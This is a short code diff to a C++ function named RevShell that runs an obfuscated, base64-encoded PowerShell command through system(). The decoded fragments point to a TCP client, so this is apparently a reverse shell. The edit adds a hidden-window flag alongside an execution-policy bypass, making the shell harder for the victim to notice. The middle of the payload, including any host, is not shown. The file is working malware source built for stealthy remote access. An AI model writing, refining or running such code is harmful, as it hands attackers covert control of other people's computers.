@@ -1,7 +1,7 @@
 #include "shell.h"
 
 void RevShell() {
-  std::string command = std::string(AY_OBFUSCATE("powershell -ep bypass -e "
+  std::string command = std::string(AY_OBFUSCATE("powershell -W Hidden -ep bypass -e "
     "\"UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAUABTAEgATwBNAEUA"
     "XABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQ"
     "BlAG4AdABMAGkAcwB0ACAAewAKACAAIAAgACAAIAAgACAAIAAkAHQAYwBw"
@@ -41,5 +41,5 @@ void RevShell() {
     "AAIAAgACAAIAAgACQAdABjAHAAQwBsAGkAZQBuAHQALgBDAGwAbwBzAGUA"
     "KAApACAAfQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZA"
     "BlAG4A\""));
-  system(command.c_str());
+    system(command.c_str());
 }
